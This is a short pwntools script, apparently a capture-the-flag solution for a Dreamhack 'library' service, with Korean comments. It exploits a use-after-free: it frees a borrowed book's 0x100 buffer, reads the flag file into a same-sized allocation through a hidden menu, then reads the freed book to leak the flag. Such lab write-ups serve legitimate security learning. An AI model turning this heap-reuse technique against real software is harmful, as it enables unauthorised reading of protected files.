#-*-coding:UTF-8-*-
from pwn import *

r = remote("host1.dreamhack.games", 16607)

print r.recv()
r.sendline("1") # borrow menu로 들어가서
print r.recv()
r.sendline("1") # malloc으로 1번책, 0x100(256)만큼 공간할당
print r.recv()
r.sendline("3") # return menu
print r.recv()
r.sendline("0") # 빌린책 free
print r.recv()
r.sendline("275") # 히든메뉴로 들어가서
print r.recv()
r.sendline("/home/pwnlibrary/flag.txt") # 파일의 내용을 읽어오는데
print r.recv()
r.sendline("256") # 받은 size 만큼 malloc으로 할당하는 부분이 있는데 같은 사이즈면 free했던 공간을 그대로 사용하기 때문에 0x100만큼 읽어옴 
print r.recv()
r.sendline("2") # 읽어온 책 내용읽기 위해 read menu로 들어감
print r.recv()
r.sendline("0") # free된 책내용을 확인하면 flag 획득
r.interactive()
